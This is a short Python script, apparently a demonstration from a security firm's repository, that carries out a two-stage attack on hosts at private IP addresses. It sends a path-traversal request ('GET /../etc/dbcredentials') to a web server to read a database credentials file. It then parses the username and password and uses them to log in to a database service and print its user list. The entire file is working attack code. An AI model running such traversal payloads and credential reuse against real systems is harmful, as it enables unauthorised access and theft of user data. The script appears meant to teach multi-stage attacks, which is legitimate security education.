# -*- coding: cp1252 -*-
#https://github.com/nerfuxion/multiStageAttack
#RedShield - Written by Fredrik Söderlund
#www.redshield.co
import socket

webServerHost = "10.0.5.22"
webServerPort = 80
webServerAttackString = "GET /../etc/dbcredentials HTTP/1.1"


dbHost = "10.0.0.22"
dbPort = 1234



#Stage 1 - Exploit Web Server Vulnerability to extract database credentials
webServerSocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
webServerSocket.connect((webServerHost, webServerPort))

webServerSocket.send(bytes(webServerAttackString, 'ascii'), len(webServerAttackString))
response = webServerSocket.recv(1024)
webServerSocket.close()

response = str(response, 'ascii')

dbCredentials = response.split(":")
userName = dbCredentials[0]
userPassword = dbCredentials[1]



#Stage 2 - Use extracted database credentials to read userlist directly from database
dbSocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
dbSocket.connect((dbHost, dbPort))

dbSocket.send(bytes(userName, 'ascii'), len(userName))
response = dbSocket.recv(1024)
    
dbSocket.send(bytes(userPassword, 'ascii'), len(userPassword))
response = dbSocket.recv(1024)

response = dbSocket.recv(1024)
dbSocket.close()
    
response = str(response, 'ascii')

print(response)

